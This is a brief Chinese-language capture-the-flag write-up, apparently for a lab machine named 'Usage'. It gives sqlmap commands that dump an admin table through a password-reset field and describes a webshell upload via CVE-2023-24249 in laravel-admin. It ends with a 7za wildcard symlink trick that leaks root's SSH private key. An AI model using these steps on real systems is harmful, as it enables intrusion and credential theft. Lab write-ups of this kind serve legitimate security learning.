---
title: Usage
description: 
tags:
  - SQL Injection
  - CVE-2023-24249
  - 7za wildcard exploit
date: 2026-04-16
---

## SQL Injection

一開始的進入點有點難找，可能要通靈一下才會發現在 reset email password 裡面可以做 SQL Injection，不過 sqlmap 一開始會掃不到，所以必須要針對性的告訴 sqlmap 要測試哪個參數：

```bash
sqlmap -r req --batch --level 5 --risk 3 --threads 10 -p email
sqlmap -r req --batch --level 5 --risk 3 --threads 10 -p email --dbs
sqlmap -r req --batch --level 5 --risk 3 --threads 10 -p email -D usage_blog
sqlmap -r req --batch --level 5 --risk 3 --threads 10 -p email -D usage_blog --tables
sqlmap -r req --batch --level 5 --risk 3 --threads 10 -p email -D usage_blog -T admin_users --dump
```

參數說明：

- -r req 從 req 這個檔案讀取 HTTP request 的內容
- --batch 以非互動模式執行，對於 sqlmap 的提示會自動選擇預設選項
- --level 5 --risk 3 提高測試的等級和風險，讓 sqlmap 進行更深入的測試
- --threads 10 使用多線程來加速測試
- -p email 指定只針對 email 這個參數進行測試

## CVE-2023-24249

進入後台後，發現使用 laravel-admin v1.8.19，可以透過上傳使用者頭像來上傳 webshell。雖然前端會擋 .php 的檔案，但是用 burpsuite 攔截修改就可以直接繞過。

## 7za wildcard exploit

這東西就神奇了，問題出在 7za 在壓縮的時候使用 `*` 來匹配檔案，亦即我們可以新增檔案在壓縮的路徑中。此時，我們可以在壓縮路徑中新增 `@ouo` 跟 `ouo` 兩個檔案，其中，替 `ouo` 建立軟連結到 `~/root/.ssh/id_rsa`， 7za 在壓縮的時候，看到 @ouo 就會去讀 ouo 檔案，id_rsa 就會噴出來了。

```bash
touch @ouo
ln -s ~/root/.ssh/id_rsa ouo
sudo usage_management           // 會觸發 7za
```